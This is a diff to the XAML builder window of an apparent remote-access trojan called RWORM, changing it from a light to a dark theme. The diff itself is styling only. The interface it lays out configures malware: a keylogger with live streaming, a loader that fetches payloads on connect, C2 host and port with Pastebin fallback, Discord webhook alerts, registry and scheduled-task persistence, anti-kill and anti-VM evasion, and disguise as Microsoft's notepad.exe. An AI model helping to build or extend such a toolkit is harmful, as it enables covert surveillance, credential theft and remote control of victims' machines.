@@ -1,4 +1,4 @@
-<Window x:Class="RWORM.GUI.Views.BuilderWindow"
+﻿<Window x:Class="RWORM.GUI.Views.BuilderWindow"
         xmlns:conv="clr-namespace:RWORM.GUI.Converters"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
@@ -6,15 +6,14 @@
         Height="620" Width="860"
         MinHeight="540" MinWidth="740"
         WindowStartupLocation="CenterScreen"
-        Background="#F8FAFC" Foreground="#0F172A">
+        Background="#0D1117" Foreground="#E6EDF3">
 
     <Window.Resources>
         <conv:InverseBoolConverter x:Key="InverseBoolConverter"/>
-
         <!-- Tab Button Style -->
         <Style x:Key="TabNavButton" TargetType="RadioButton">
             <Setter Property="Background" Value="Transparent"/>
-            <Setter Property="Foreground" Value="#64748B"/>
+            <Setter Property="Foreground" Value="#8B949E"/>
             <Setter Property="FontSize" Value="13"/>
             <Setter Property="FontWeight" Value="SemiBold"/>
             <Setter Property="Padding" Value="18,12"/>
@@ -29,13 +28,13 @@
                         </Border>
                         <ControlTemplate.Triggers>
                             <Trigger Property="IsMouseOver" Value="True">
-                                <Setter Property="Foreground" Value="#0F172A"/>
-                                <Setter TargetName="TabBorder" Property="Background" Value="#F1F5F9"/>
+                                <Setter Property="Foreground" Value="#E6EDF3"/>
+                                <Setter TargetName="TabBorder" Property="Background" Value="#161B22"/>
                             </Trigger>
                             <Trigger Property="IsChecked" Value="True">
-                                <Setter Property="Foreground" Value="#2563EB"/>
-                                <Setter TargetName="TabBorder" Property="BorderBrush" Value="#2563EB"/>
-                                <Setter TargetName="TabBorder" Property="Background" Value="#EFF6FF"/>
+                                <Setter Property="Foreground" Value="#58A6FF"/>
+                                <Setter TargetName="TabBorder" Property="BorderBrush" Value="#58A6FF"/>
+                                <Setter TargetName="TabBorder" Property="Background" Value="#161B22"/>
                             </Trigger>
                         </ControlTemplate.Triggers>
                     </ControlTemplate>
@@ -44,21 +43,21 @@
         </Style>
 
         <!-- Card Style -->
-        <Style x:Key="LightCard" TargetType="Border">
-            <Setter Property="Background" Value="#FFFFFF"/>
-            <Setter Property="BorderBrush" Value="#E2E8F0"/>
+        <Style x:Key="DarkCard" TargetType="Border">
+            <Setter Property="Background" Value="#161B22"/>
+            <Setter Property="BorderBrush" Value="#30363D"/>
             <Setter Property="BorderThickness" Value="1"/>
             <Setter Property="CornerRadius" Value="8"/>
             <Setter Property="Padding" Value="18"/>
             <Setter Property="Margin" Value="0,0,0,14"/>
         </Style>
 
-        <!-- Light TextBox -->
-        <Style x:Key="LightTextBox" TargetType="TextBox">
-            <Setter Property="Background" Value="#FFFFFF"/>
-            <Setter Property="Foreground" Value="#0F172A"/>
-            <Setter Property="CaretBrush" Value="#0F172A"/>
-            <Setter Property="BorderBrush" Value="#CBD5E1"/>
+        <!-- Dark TextBox -->
+        <Style x:Key="DarkTextBox" TargetType="TextBox">
+            <Setter Property="Background" Value="#21262D"/>
+            <Setter Property="Foreground" Value="#E6EDF3"/>
+            <Setter Property="CaretBrush" Value="#E6EDF3"/>
+            <Setter Property="BorderBrush" Value="#30363D"/>
             <Setter Property="BorderThickness" Value="1"/>
             <Setter Property="Padding" Value="10,6"/>
             <Setter Property="FontSize" Value="13"/>
@@ -77,9 +76,9 @@
             </Setter>
         </Style>
 
-        <!-- Light CheckBox -->
-        <Style x:Key="LightCheckBox" TargetType="CheckBox">
-            <Setter Property="Foreground" Value="#0F172A"/>
+        <!-- Dark CheckBox -->
+        <Style x:Key="DarkCheckBox" TargetType="CheckBox">
+            <Setter Property="Foreground" Value="#E6EDF3"/>
             <Setter Property="FontSize" Value="13"/>
             <Setter Property="Margin" Value="0,0,0,8"/>
             <Setter Property="Cursor" Value="Hand"/>
@@ -88,20 +87,17 @@
 
     <Grid>
         <Grid.RowDefinitions>
-            <RowDefinition Height="54"/>
-            <RowDefinition Height="*"/>
             <RowDefinition Height="50"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="52"/>
         </Grid.RowDefinitions>
 
         <!-- Header / Tab Bar -->
-        <Border Grid.Row="0" Background="#FFFFFF" BorderBrush="#E2E8F0" BorderThickness="0,0,0,1">
-            <Grid Margin="18,0">
-                <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
-                    <StackPanel Orientation="Horizontal" Margin="0,0,24,0" VerticalAlignment="Center">
-                        <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="20" Height="20" Margin="0,0,8,0" VerticalAlignment="Center"/>
-                        <TextBlock Text="RWORM BUILDER" FontSize="14" FontWeight="Bold" Foreground="#0F172A" VerticalAlignment="Center"/>
-                    </StackPanel>
-
+        <Border Grid.Row="0" Background="#161B22" BorderBrush="#30363D" BorderThickness="0,0,0,1">
+            <Grid Margin="16,0">
+                <StackPanel Orientation="Horizontal" HorizontalAlignment="Left">
+                    <TextBlock Text="🔨 RWORM BUILDER" FontSize="14" FontWeight="Bold" Foreground="#E6EDF3"
+                               VerticalAlignment="Center" Margin="0,0,24,0"/>
                     <RadioButton x:Name="TabSurveillance" Style="{StaticResource TabNavButton}" Content="SURVEILLANCE"
                                  GroupName="BuilderTabs" IsChecked="True" Click="Tab_Click" Tag="0"/>
                     <RadioButton x:Name="TabListener" Style="{StaticResource TabNavButton}" Content="LISTENER"
@@ -127,72 +123,72 @@
                 <ScrollViewer VerticalScrollBarVisibility="Auto">
                     <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                         <TextBlock Text="Surveillance &amp; Evasion Settings" FontSize="18" FontWeight="SemiBold"
-                                   Foreground="#0F172A" Margin="0,0,0,4"/>
+                                   Foreground="#E6EDF3" Margin="0,0,0,4"/>
                         <TextBlock Text="Configure persistence, process protection, sandboxing defense, and activity monitoring."
-                                   FontSize="12" Foreground="#64748B" Margin="0,0,0,16"/>
+                                   FontSize="12" Foreground="#8B949E" Margin="0,0,0,16"/>
 
                         <!-- Evasion & Security -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="Defense &amp; Alerts" FontSize="14" FontWeight="SemiBold" Foreground="#2563EB" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Kill (Block Process Termination via Mutual Watchdog)"
+                                <TextBlock Text="Defense &amp; Alerts" FontSize="14" FontWeight="SemiBold" Foreground="#58A6FF" Margin="0,0,0,12"/>
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Anti-Kill (Block Process Termination)"
                                           IsChecked="{Binding BuildAntiKill}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Sandbox / Anti-VM (Halt in Virtual Environments)"
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Anti-Sandbox / Anti-VM (Halt in Virtual Environments)"
                                           IsChecked="{Binding BuildAntiSandbox}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Discord Webhook Alert (Notify on client connection)"
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Discord Webhook Alert (Notify on client connection)"
                                           IsChecked="{Binding BuildDiscordAlert}" Margin="0,6,0,6"/>
                                 <Grid Margin="24,0,0,4" IsEnabled="{Binding BuildDiscordAlert}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="Auto"/>
                                         <ColumnDefinition Width="*"/>
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Text="Webhook URL:" FontSize="12" Foreground="#475569" VerticalAlignment="Center" Margin="0,0,10,0"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="34"
+                                    <TextBlock Text="Webhook URL:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Height="32"
                                              Text="{Binding BuildDiscordWebhook, UpdateSourceTrigger=PropertyChanged}"/>
                                 </Grid>
                             </StackPanel>
                         </Border>
 
                         <!-- Persistence Settings -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="Persistence Settings" FontSize="14" FontWeight="SemiBold" Foreground="#2563EB" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Startup Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)"
+                                <TextBlock Text="Persistence Settings" FontSize="14" FontWeight="SemiBold" Foreground="#58A6FF" Margin="0,0,0,12"/>
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Startup Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)"
                                           IsChecked="{Binding BuildStartupRegistry}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Scheduled Tasks (SCH TASKS — Auto-restart on user logon)"
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Scheduled Tasks (SCH TASKS — Auto-restart on user logon)"
                                           IsChecked="{Binding BuildSchTasks}"/>
                                 <StackPanel Orientation="Horizontal" Margin="0,6,0,0">
-                                    <TextBlock Text="Installation / Startup Path:" FontSize="12" Foreground="#475569" VerticalAlignment="Center" Margin="0,0,12,0"/>
-                                    <TextBox Style="{StaticResource LightTextBox}" Width="320" Height="34"
+                                    <TextBlock Text="Installation / Startup Path:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center" Margin="0,0,12,0"/>
+                                    <TextBox Style="{StaticResource DarkTextBox}" Width="320" Height="32"
                                              Text="{Binding BuildStartupPath, UpdateSourceTrigger=PropertyChanged}"/>
                                 </StackPanel>
                             </StackPanel>
                         </Border>
 
                         <!-- Surveillance / Keylogger / Loader -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="Monitoring &amp; Tasks" FontSize="14" FontWeight="SemiBold" Foreground="#2563EB" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Keylogger"
+                                <TextBlock Text="Monitoring &amp; Tasks" FontSize="14" FontWeight="SemiBold" Foreground="#58A6FF" Margin="0,0,0,12"/>
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Enable Keylogger"
                                           IsChecked="{Binding BuildKeyloggerEnabled}"/>
                                 <StackPanel Orientation="Horizontal" Margin="24,0,0,12" IsEnabled="{Binding BuildKeyloggerEnabled}">
                                     <RadioButton Content="Offline (log to file until retrieved)"
                                                  IsChecked="{Binding BuildKeyloggerOnline, Converter={StaticResource InverseBoolConverter}, Mode=TwoWay}"
-                                                 Foreground="#475569" Margin="0,0,16,0"/>
+                                                 Foreground="#8B949E" Margin="0,0,16,0"/>
                                     <RadioButton Content="Online (stream live)"
                                                  IsChecked="{Binding BuildKeyloggerOnline}"
-                                                 Foreground="#475569"/>
+                                                 Foreground="#8B949E"/>
                                 </StackPanel>
 
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Loader Task on Connect"
+                                <CheckBox Style="{StaticResource DarkCheckBox}" Content="Enable Loader Task on Connect"
                                           IsChecked="{Binding BuildTaskEnabled}" Margin="0,6,0,6"/>
                                 <Grid Margin="24,0,0,0" IsEnabled="{Binding BuildTaskEnabled}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="Auto"/>
                                         <ColumnDefinition Width="*"/>
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Text="Payload URL:" FontSize="12" Foreground="#475569" VerticalAlignment="Center" Margin="0,0,10,0"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="34"
+                                    <TextBlock Text="Payload URL:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Height="32"
                                              Text="{Binding BuildTaskUrl, UpdateSourceTrigger=PropertyChanged}"/>
                                 </Grid>
                             </StackPanel>
@@ -206,63 +202,56 @@
                 <ScrollViewer VerticalScrollBarVisibility="Auto">
                     <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                         <TextBlock Text="Listener &amp; Connection Settings" FontSize="18" FontWeight="SemiBold"
-                                   Foreground="#0F172A" Margin="0,0,0,4"/>
+                                   Foreground="#E6EDF3" Margin="0,0,0,4"/>
                         <TextBlock Text="Configure C2 connection parameters and dynamic host resolution."
-                                   FontSize="12" Foreground="#64748B" Margin="0,0,0,16"/>
+                                   FontSize="12" Foreground="#8B949E" Margin="0,0,0,16"/>
 
                         <!-- Primary Connection -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="Primary C2 Server" FontSize="14" FontWeight="SemiBold" Foreground="#2563EB" Margin="0,0,0,12"/>
+                                <TextBlock Text="Primary C2 Server" FontSize="14" FontWeight="SemiBold" Foreground="#58A6FF" Margin="0,0,0,12"/>
                                 <Grid Margin="0,0,0,12">
                                     <Grid.ColumnDefinitions>
-                                        <ColumnDefinition Width="150"/>
+                                        <ColumnDefinition Width="140"/>
                                         <ColumnDefinition Width="*"/>
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Text="C2 Host / IP:" FontSize="13" FontWeight="SemiBold" Foreground="#0F172A" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
-                                             Text="{Binding BuildHost, UpdateSourceTrigger=PropertyChanged}"
-                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
-                                             FontWeight="SemiBold"
-                                             FontSize="13"/>
+                                    <TextBlock Text="IPs / C2 Host:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Height="34"
+                                             Text="{Binding BuildHost, UpdateSourceTrigger=PropertyChanged}"/>
                                 </Grid>
 
                                 <Grid Margin="0,0,0,12">
                                     <Grid.ColumnDefinitions>
-                                        <ColumnDefinition Width="150"/>
+                                        <ColumnDefinition Width="140"/>
                                         <ColumnDefinition Width="*"/>
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Text="C2 Port:" FontSize="13" FontWeight="SemiBold" Foreground="#0F172A" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
-                                             Text="{Binding BuildPort, UpdateSourceTrigger=PropertyChanged}"
-                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
-                                             FontWeight="SemiBold"
-                                             FontSize="13"/>
+                                    <TextBlock Text="C2 Port:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Height="34"
+                                             Text="{Binding BuildPort, UpdateSourceTrigger=PropertyChanged}"/>
                                 </Grid>
 
                                 <Grid Margin="0,0,0,4">
                                     <Grid.ColumnDefinitions>
-                                        <ColumnDefinition Width="150"/>
+                                        <ColumnDefinition Width="140"/>
                                         <ColumnDefinition Width="*"/>
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Text="Encryption Key:" FontSize="13" Foreground="#475569" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
+                                    <TextBlock Text="Encryption Key:" FontSize="12" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Height="34"
                                              Text="{Binding BuildEncryptionKey, UpdateSourceTrigger=PropertyChanged}"
-                                             IsEnabled="False" Background="#F1F5F9"/>
+                                             IsEnabled="False" ToolTip="Custom key rotation (daha eklemicez bunu)"/>
                                 </Grid>
-                                <TextBlock Text="Standard AES-256 encrypted tunnel active by default"
-                                           FontSize="11" Foreground="#64748B" Margin="150,4,0,0"/>
+                                <TextBlock Text="ℹ️ (daha eklemicez bunu — default AES-256 standard channel active)"
+                                           FontSize="11" Foreground="#6E7681" Margin="140,4,0,0"/>
                             </StackPanel>
                         </Border>
 
                         <!-- Dynamic Pastebin Host Resolution -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="Dynamic Resolution (Pastebin Raw)" FontSize="14" FontWeight="SemiBold" Foreground="#2563EB" Margin="0,0,0,12"/>
-                                <TextBlock Text="Get IP / Port from Pastebin raw URL (Dynamic C2 fallback):" FontSize="12" Foreground="#475569" Margin="0,0,0,8"/>
-                                <TextBox Style="{StaticResource LightTextBox}" Height="36"
+                                <TextBlock Text="Dynamic Resolution (Pastebin Raw)" FontSize="14" FontWeight="SemiBold" Foreground="#58A6FF" Margin="0,0,0,12"/>
+                                <TextBlock Text="Get IP / Port from Pastebin raw URL (Dynamic C2 fallback):" FontSize="12" Foreground="#8B949E" Margin="0,0,0,8"/>
+                                <TextBox Style="{StaticResource DarkTextBox}" Height="34"
                                          Text="{Binding BuildPastebinRaw, UpdateSourceTrigger=PropertyChanged}"
-                                         FontFamily="Cascadia Code, Consolas, Segoe UI"
                                          ToolTip="Example: https://pastebin.com/raw/xxxxxx"/>
                             </StackPanel>
                         </Border>
@@ -275,39 +264,37 @@
                 <ScrollViewer VerticalScrollBarVisibility="Auto">
                     <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                         <TextBlock Text="Assembly &amp; Metadata (Notepad Spoofed)" FontSize="18" FontWeight="SemiBold"
-                                   Foreground="#0F172A" Margin="0,0,0,4"/>
+                                   Foreground="#E6EDF3" Margin="0,0,0,4"/>
                         <TextBlock Text="Clone binary metadata and custom icons to blend seamlessly into host operating systems."
-                                   FontSize="12" Foreground="#64748B" Margin="0,0,0,16"/>
+                                   FontSize="12" Foreground="#8B949E" Margin="0,0,0,16"/>
 
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}" Opacity="0.6">
                             <StackPanel>
-                                <Border Background="#EFF6FF" BorderBrush="#BFDBFE" BorderThickness="1" CornerRadius="6" Padding="14,10" Margin="0,0,0,16">
-                                    <StackPanel Orientation="Horizontal">
-                                        <Image Source="pack://application:,,,/Resources/Assets/shield.png" Width="20" Height="20" Margin="0,0,10,0" VerticalAlignment="Center"/>
-                                        <TextBlock Text="ACTIVE — Watchdog spoofed as notepad.exe with authentic Microsoft Notepad assembly metadata &amp; icon."
-                                                   Foreground="#1D4ED8" FontWeight="SemiBold" FontSize="12.5" VerticalAlignment="Center"/>
-                                    </StackPanel>
+                                <Border Background="#21262D" CornerRadius="6" Padding="12,8" Margin="0,0,0,16">
+                                    <TextBlock Text="🛡️ ACTIVE — Watchdog spoofed as notepad.exe with authentic Microsoft Notepad assembly metadata &amp; icon."
+                                               Foreground="#D29922" FontWeight="SemiBold" FontSize="12"/>
                                 </Border>
 
-                                <Grid Margin="0,0,0,10">
-                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="File Title:" Foreground="#475569" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="Notepad" IsReadOnly="True" Background="#F8FAFC"/>
+                                <Grid Margin="0,0,0,10" IsEnabled="False">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="130"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="File Title:" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Text="Notepad"/>
                                 </Grid>
-                                <Grid Margin="0,0,0,10">
-                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Description:" Foreground="#475569" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="Notepad" IsReadOnly="True" Background="#F8FAFC"/>
+                                <Grid Margin="0,0,0,10" IsEnabled="False">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="130"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="Description:" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Text="Notepad"/>
                                 </Grid>
-                                <Grid Margin="0,0,0,10">
-                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Company:" Foreground="#475569" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="Microsoft Corporation" IsReadOnly="True" Background="#F8FAFC"/>
+                                <Grid Margin="0,0,0,10" IsEnabled="False">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="130"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="Company:" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <TextBox Grid.Column="1" Style="{StaticResource DarkTextBox}" Text="Microsoft Corporation"/>
                                 </Grid>
-                                <Grid Margin="0,0,0,10">
-                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Icon File:" Foreground="#475569" VerticalAlignment="Center"/>
-                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="notepad.ico (Cloned from System32\notepad.exe RT_GROUP_ICON)" IsReadOnly="True" Background="#F8FAFC"/>
+                                <Grid Margin="0,0,0,10" IsEnabled="False">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="130"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="Icon File (.ico):" Foreground="#8B949E" VerticalAlignment="Center"/>
+                                    <Button Grid.Column="1" Content="📁 Select Icon..." Background="#21262D" Foreground="#8B949E"
+                                            BorderBrush="#30363D" BorderThickness="1" Height="32" HorizontalAlignment="Left" Padding="14,0"/>
                                 </Grid>
                             </StackPanel>
                         </Border>
@@ -320,19 +307,19 @@
                 <ScrollViewer VerticalScrollBarVisibility="Auto">
                     <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                         <TextBlock Text="Build Summary &amp; Compilation" FontSize="18" FontWeight="SemiBold"
-                                   Foreground="#0F172A" Margin="0,0,0,4"/>
+                                   Foreground="#E6EDF3" Margin="0,0,0,4"/>
                         <TextBlock Text="Review active payload parameters and generate the self-contained executable (~11 MB)."
-                                   FontSize="12" Foreground="#64748B" Margin="0,0,0,16"/>
+                                   FontSize="12" Foreground="#8B949E" Margin="0,0,0,16"/>
 
                         <!-- Active Settings Card -->
-                        <Border Style="{StaticResource LightCard}">
+                        <Border Style="{StaticResource DarkCard}">
                             <StackPanel>
-                                <TextBlock Text="ACTIVE SETTINGS" FontSize="14" FontWeight="SemiBold" Foreground="#10B981" Margin="0,0,0,12"/>
+                                <TextBlock Text="ACTIVE SETTINGS:" FontSize="14" FontWeight="SemiBold" Foreground="#3FB950" Margin="0,0,0,12"/>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Target Endpoint:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Foreground="#0F172A" FontWeight="Bold" FontFamily="Cascadia Code, Consolas, Segoe UI">
+                                    <TextBlock Text="Target Endpoint:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Foreground="#E6EDF3" FontWeight="SemiBold">
                                         <TextBlock.Text>
                                             <MultiBinding StringFormat="{}{0}:{1}">
                                                 <Binding Path="BuildHost"/>
@@ -342,52 +329,64 @@
                                     </TextBlock>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Pastebin Fallback:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="{Binding BuildPastebinRaw, FallbackValue='(Not configured)'}" Foreground="#0F172A"/>
+                                    <TextBlock Text="Pastebin Fallback:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="{Binding BuildPastebinRaw, FallbackValue='(Not configured)'}" Foreground="#E6EDF3"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Binary Packaging:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="Self-Contained &amp; IL-Trimmed (Single File ~11 MB)" Foreground="#2563EB" FontWeight="SemiBold"/>
+                                    <TextBlock Text="Encryption Key:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="AES-256 (daha eklemicez)" Foreground="#8B949E"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Anti-Kill Protection:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="{Binding BuildAntiKill, StringFormat='Active: {0}'}" Foreground="#0F172A" FontWeight="SemiBold"/>
+                                    <TextBlock Text="Binary Packaging:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="Self-Contained &amp; IL-Trimmed (Single File ~11 MB)" Foreground="#58A6FF" FontWeight="SemiBold"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Watchdog Process:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="notepad.exe (Stealth Watchdog)" Foreground="#10B981" FontWeight="Bold"/>
+                                    <TextBlock Text="Anti-Kill Protection:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="{Binding BuildAntiKill, StringFormat='Active: {0}'}" Foreground="#E6EDF3"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Assembly Spoofing:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="Notepad (Microsoft Corporation)" Foreground="#2563EB"/>
+                                    <TextBlock Text="Discord Alert:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="{Binding BuildDiscordAlert, StringFormat='Active: {0}'}" Foreground="#E6EDF3"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Discord Alert:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="{Binding BuildDiscordAlert, StringFormat='Active: {0}'}" Foreground="#0F172A"/>
+                                    <TextBlock Text="Keylogger Module:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="{Binding BuildKeyloggerEnabled, StringFormat='Enabled: {0}'}" Foreground="#E6EDF3"/>
                                 </Grid>
 
-                                <Grid Margin="0,0,0,8">
+                                <Grid Margin="0,0,0,6">
                                     <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
-                                    <TextBlock Text="Keylogger Module:" Foreground="#64748B"/>
-                                    <TextBlock Grid.Column="1" Text="{Binding BuildKeyloggerEnabled, StringFormat='Enabled: {0}'}" Foreground="#0F172A"/>
+                                    <TextBlock Text="Watchdog Process:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="notepad.exe (Stealth Watchdog)" Foreground="#3FB950" FontWeight="SemiBold"/>
+                                </Grid>
+
+                                <Grid Margin="0,0,0,6">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="Assembly Spoofing:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="Notepad (Microsoft Corporation)" Foreground="#58A6FF"/>
+                                </Grid>
+
+                                <Grid Margin="0,0,0,6">
+                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
+                                    <TextBlock Text="Icon:" Foreground="#8B949E"/>
+                                    <TextBlock Grid.Column="1" Text="notepad.ico (System32 Cloned)" Foreground="#58A6FF"/>
                                 </Grid>
                             </StackPanel>
                         </Border>
 
                         <!-- Build Execution Card -->
-                        <Border Style="{StaticResource LightCard}" Background="#F0FDF4" BorderBrush="#86EFAC">
+                        <Border Style="{StaticResource DarkCard}" Background="#1F242C" BorderBrush="#3FB950">
                             <Grid>
                                 <Grid.ColumnDefinitions>
                                     <ColumnDefinition Width="*"/>
@@ -395,27 +394,26 @@
                                 </Grid.ColumnDefinitions>
 
                                 <StackPanel VerticalAlignment="Center">
-                                    <TextBlock Text="Ready to compile client payload." FontSize="14" FontWeight="SemiBold" Foreground="#0F172A"/>
-                                    <TextBlock Text="Compiled binary will be packaged as a standalone executable." FontSize="12" Foreground="#475569" Margin="0,4,0,0"/>
